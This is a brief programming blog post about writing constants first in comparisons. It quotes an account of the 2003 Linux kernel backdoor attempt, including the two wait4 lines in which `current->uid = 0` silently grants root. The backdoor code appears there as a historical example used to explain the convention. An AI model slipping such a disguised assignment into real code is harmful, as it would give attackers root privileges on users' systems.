---
layout: post
title: "why put const before if condition"
description: ""
category: "csharp"
tags: [convention]
---
{% include JB/setup %}


I always see some code like this `if(null == obj)` from some open source project
and I didn't realize why the author write this instead of `if(obj == null)` until I saw this article

>Today I want to write about another incident, in 2003, in which someone tried to backdoor the Linux kernel. This one was definitely an attempt to insert a backdoor. But we don’t know who it was that made the attempt—and we probably never will.
Back in 2003 Linux used a system called BitKeeper to store the master copy of the Linux source code. If a developer wanted to propose a modification to the Linux code, they would submit their proposed change, and it would go through an organized approval process to decide whether the change would be accepted into the master code. Every change to the master code would come with a short explanation, which always included a pointer to the record of its approval.
But some people didn’t like BitKeeper, so a second copy of the source code was kept so that developers could get the code via another code system called CVS. The CVS copy of the code was a direct clone of the primary BitKeeper copy.
But on Nov. 5, 2003, Larry McVoy noticed that there was a code change in the CVS copy that did not have a pointer to a record of approval. Investigation showed that the change had never been approved and, stranger yet, that this change did not appear in the primary BitKeeper repository at all. Further investigation determined that someone had apparently broken in (electronically) to the CVS server and inserted this change.
What did the change do? This is where it gets really interesting. The change modified the code of a Linux function called wait4, which a program could use to wait for something to happen. Specifically, it added these two lines of code:
if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
        retval = -EINVAL;
[Exercise for readers who know the C programming language: What is unusual about this code? Answer appears below.]
A casual reading by an expert would interpret this as innocuous error-checking code to make wait4 return an error code when wait4 was called in a certain way that was forbidden by the documentation. But a really careful expert reader would notice that, near the end of the first line, it said “= 0” rather than “== 0”. The normal thing to write in code like this is “== 0”, which tests whether the user ID of the currently running code (current->uid) is equal to zero, without modifying the user ID. But what actually appears is “= 0”, which has the effect of setting the user ID to zero.
Setting the user ID to zero is a problem because user ID number zero is the “root” user, which is allowed to do absolutely anything it wants—to access all data, change the behavior of all code, and to compromise entirely the security of all parts of the system. So the effect of this code is to give root privileges to any piece of software that called wait4 in a particular way that is supposed to be invalid. In other words … it’s a classic backdoor.


yes sometimes `if(obj == null)` will be mistakenly wrote to `if(obj = null)` and this bug will sometimes hard to be discovered
and `if(null == obj)` can make sure this kind of mistake will not happened/